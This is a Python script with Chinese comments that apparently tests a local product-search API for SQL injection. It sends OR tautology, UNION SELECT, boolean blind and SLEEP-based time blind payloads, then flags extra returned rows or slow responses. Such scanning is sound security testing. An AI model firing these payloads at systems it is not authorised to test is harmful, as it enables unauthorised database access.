import requests
import time

BASE_URL = "http://localhost:8080/api/product"

# 测试用例列表
test_cases = [
    # 基础注入
    ("' OR '1'='1", "基础OR注入"),
    ("' OR '1'='1' -- ", "基础OR注入(注释)"),
    ("' OR '1'='1' #", "基础OR注入(MySQL注释)"),

    # UNION注入
    ("' UNION SELECT NULL,NULL,NULL,NULL -- ", "UNION注入测试"),
    ("' UNION SELECT 1,2,3,4 -- ", "UNION注入(列数测试)"),

    # 布尔盲注
    ("' AND 1=1 -- ", "布尔盲注(真)"),
    ("' AND 1=2 -- ", "布尔盲注(假)"),

    # 时间盲注
    ("' AND SLEEP(5) -- ", "时间盲注"),
    ("' AND IF(1=1,SLEEP(5),0) -- ", "条件时间盲注"),
]

def test_sql_injection(payload, description):
    """测试SQL注入"""
    url = f"{BASE_URL}/search"
    params = {"name": payload}

    print(f"\n测试: {description}")
    print(f"Payload: {payload}")

    try:
        start_time = time.time()
        response = requests.get(url, params=params, timeout=10)
        elapsed_time = time.time() - start_time

        print(f"状态码: {response.status_code}")
        print(f"响应时间: {elapsed_time:.2f}秒")

        if response.status_code == 200:
            data = response.json()
            print(f"响应数据: {data}")
            if isinstance(data, list) and len(data) > 1:
                print("⚠️  警告: 可能存在SQL注入漏洞！返回了多条记录")
            elif elapsed_time > 4:
                print("⚠️  警告: 响应时间异常，可能存在时间盲注漏洞！")
        else:
            print(f"响应: {response.text[:200]}")

    except requests.exceptions.Timeout:
        print("⚠️  请求超时，可能存在时间盲注漏洞！")
    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("SQL注入测试开始")
    print("=" * 60)

    for payload, description in test_cases:
        test_sql_injection(payload, description)
        time.sleep(1)  # 避免请求过快

    print("\n" + "=" * 60)
    print("测试完成")
    print("=" * 60)